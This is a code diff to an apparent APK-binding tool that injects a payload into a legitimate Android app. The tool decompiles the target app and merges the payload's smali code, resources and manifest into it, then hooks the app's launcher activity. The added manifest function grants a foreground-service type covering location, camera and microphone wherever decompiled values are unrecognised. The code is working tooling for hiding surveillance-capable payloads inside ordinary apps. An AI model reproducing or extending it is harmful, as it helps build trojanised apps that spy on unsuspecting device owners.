@@ -164,6 +164,85 @@ def merge_smali_and_assets(payload_dir, target_dir):
     log_success("Payload Smali classes and assets successfully merged.")
 
 
+def merge_resources(payload_dir, target_dir):
+    log_info("Merging payload resources (drawables, mipmaps, values) into target...")
+    payload_res = os.path.join(payload_dir, "res")
+    target_res = os.path.join(target_dir, "res")
+
+    if os.path.exists(payload_res):
+        os.makedirs(target_res, exist_ok=True)
+        for root, dirs, files in os.walk(payload_res):
+            rel = os.path.relpath(root, payload_res)
+            dst_root = os.path.join(target_res, rel)
+            os.makedirs(dst_root, exist_ok=True)
+            for f in files:
+                sf = os.path.join(root, f)
+                df = os.path.join(dst_root, f)
+                if not os.path.exists(df):
+                    shutil.copy2(sf, df)
+
+    # Merge values/*.xml (styles, colors, strings)
+    payload_values = os.path.join(payload_res, "values")
+    target_values = os.path.join(target_res, "values")
+    if os.path.exists(payload_values) and os.path.exists(target_values):
+        for xml_file in ["styles.xml", "colors.xml", "strings.xml", "drawables.xml"]:
+            p_xml = os.path.join(payload_values, xml_file)
+            t_xml = os.path.join(target_values, xml_file)
+            if os.path.exists(p_xml) and os.path.exists(t_xml):
+                try:
+                    p_tree = ET.parse(p_xml)
+                    t_tree = ET.parse(t_xml)
+                    p_root = p_tree.getroot()
+                    t_root = t_tree.getroot()
+                    existing_names = {c.attrib.get('name') for c in t_root if c.attrib.get('name')}
+                    added = False
+                    for elem in p_root:
+                        name = elem.attrib.get('name')
+                        if name and name not in existing_names:
+                            t_root.append(elem)
+                            existing_names.add(name)
+                            added = True
+                    if added:
+                        t_tree.write(t_xml, encoding='utf-8', xml_declaration=True)
+                except Exception as e:
+                    log_warn(f"Values merge notice for {xml_file}: {e}")
+
+    log_success("Payload resources successfully merged into target res directory.")
+
+
+def sanitize_manifest_and_resources(target_dir):
+    log_info("Sanitizing AndroidManifest.xml for AAPT2 compatibility...")
+    manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
+    if not os.path.exists(manifest_path):
+        return
+
+    with open(manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
+        content = f.read()
+
+    # Map decompiled raw hex values for foregroundServiceType to string flag names
+    hex_map = {
+        '0x40000009': 'dataSync|location|specialUse',
+        '0x40000001': 'dataSync|specialUse',
+        '0x40000000': 'specialUse',
+        '0x00000001': 'dataSync',
+        '0x00000008': 'location',
+        '0x00000040': 'camera',
+        '0x00000080': 'microphone',
+        '0x00000020': 'mediaProjection'
+    }
+
+    for hex_val, flag_str in hex_map.items():
+        content = content.replace(f'android:foregroundServiceType="{hex_val}"', f'android:foregroundServiceType="{flag_str}"')
+
+    # Replace any remaining android:foregroundServiceType="0x..." hex strings with valid flag string
+    content = re.sub(r'android:foregroundServiceType="0x[0-9a-fA-F]+"', 'android:foregroundServiceType="dataSync|location|camera|microphone|specialUse"', content)
+
+    with open(manifest_path, 'w', encoding='utf-8') as f:
+        f.write(content)
+
+    log_success("Manifest & foregroundServiceType attributes sanitized.")
+
+
 def merge_manifests(payload_dir, target_dir):
     log_info("Performing AndroidManifest.xml surgery...")
     target_manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
@@ -402,7 +481,9 @@ def main():
         decompile_apk(apktool_cmd, target_apk, target_dir)
 
         merge_smali_and_assets(payload_dir, target_dir)
+        merge_resources(payload_dir, target_dir)
         merge_manifests(payload_dir, target_dir)
+        sanitize_manifest_and_resources(target_dir)
 
         launcher_class = find_launcher_activity(target_dir)
         hook_launcher_activity(target_dir, launcher_class)
